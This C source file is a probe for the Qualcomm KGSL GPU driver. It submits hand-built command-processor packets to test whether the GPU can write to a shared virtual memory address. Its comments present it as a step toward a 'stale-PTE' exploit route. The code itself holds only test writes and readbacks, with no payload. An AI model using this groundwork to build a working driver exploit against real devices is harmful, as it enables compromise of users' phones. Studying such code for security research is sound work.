/* kgsl-svmcp.c — is a single SVM gpuaddr actually reachable by the a5xx CP?
 *
 * The stale-PTE attempt faulted on a stale SVM address. Before going further,
 * test the basic question cleanly: allocate ONE SVM entry (KGSL_MEMFLAGS_USE_CPU_MAP),
 * mmap it (gpuaddr == useraddr == G), CPU-write v[0], have the CP write G and a
 * non-SVM marker, then read both back from the CPU.
 *
 * If the marker lands but G does not -> SVM addresses are not (CPU-coherently)
 * GPU-writable in this build. If G lands -> the earlier fault was specific to the
 * double-region teardown and the stale-PTE route is alive.
 *
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL

struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp;
};
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d

static int fd;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(45);
    printf("== kgsl SVM CP-write test (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca)<0){ printf("[-] cmd: %s\n",strerror(errno)); return 1; }
    uint32_t *cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ca.id<<12);
    if(cmd==MAP_FAILED){ printf("[-] mmap cmd: %s\n",strerror(errno)); return 1; }
    memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma)<0){ printf("[-] marker: %s\n",strerror(errno)); return 1; }
    uint32_t *mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    if(mark==MAP_FAILED){ printf("[-] mmap marker: %s\n",strerror(errno)); return 1; }

    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    if(ioctl(fd,IOCTL_CTXT_CREATE,&cc)<0){ printf("[-] ctxt: %s\n",strerror(errno)); return 1; }

    /* --- case A: non-SVM control --- */
    uint32_t *p=cmd; mark[0]=0xA0000001u;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,ma.gpuaddr); *p++=0xA5A5A5A5u;
    int ndw=(int)(p-cmd);
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=ca.gpuaddr; cob.size=(uint64_t)ndw*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=ca.gpuaddr; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=ca.id;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=cc.drawctxt_id;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    errno=0; int r=ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    usleep(250000);
    printf("[A] non-SVM control: rc=%d errno=%d mark=0x%08x (want A5A5A5A5)\n",r,errno,mark[0]);
    if(mark[0]!=0xA5A5A5A5u){ printf("[-] CP control failed; aborting\n"); return 1; }

    /* --- case B: one SVM entry --- */
    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=0x1000; sa.flags=USE_CPU_MAP; sa.va_len=0x1000;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] svm alloc: %s\n",strerror(errno)); return 1; }
    void *v=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    if(v==MAP_FAILED){ printf("[-] mmap svm: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info si; memset(&si,0,sizeof si); si.id=sa.id;
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si);
    ((uint32_t*)v)[0]=0x11111111u;
    printf("[B] SVM id=%u gpuaddr=0x%llx va_addr=0x%llx flags=0x%llx (v=%p)\n",
           sa.id,(unsigned long long)si.gpuaddr,(unsigned long long)si.va_addr,
           (unsigned long long)si.flags,v);

    p=cmd; mark[0]=0xB0000002u;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,si.gpuaddr); *p++=0xBEEF0001u;  /* SVM addr */
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,ma.gpuaddr);  *p++=0xC0DE0002u;  /* control */
    ndw=(int)(p-cmd);
    cob.size=(uint64_t)ndw*4; gc.timestamp=0;
    errno=0; r=ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    usleep(300000);
    printf("[B] submit rc=%d errno=%d\n",r,errno);
    printf("    svm v[0]      = 0x%08x  %s\n",((uint32_t*)v)[0],
           ((uint32_t*)v)[0]==0xBEEF0001u?"<<< SVM GPU WRITE LANDED":"(SVM write did not land)");
    printf("    ctrl mark[0]  = 0x%08x  %s\n",mark[0],
           mark[0]==0xC0DE0002u?"(CP alive after SVM write)":"(CP faulted on SVM write)");

    /* --- case C: CPU write SVM, CP write other half, read back --- */
    ((uint32_t*)v)[0]=0x0BADF00Du;   /* if CPU write vanished, GPU path is odd */
    printf("[C] after CPU write, v[0]=0x%08x (0BADF00D => CPU mapping sane)\n",((uint32_t*)v)[0]);

    { struct kgsl_drawctxt_destroy x={cc.drawctxt_id}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n");
    return 0;
}
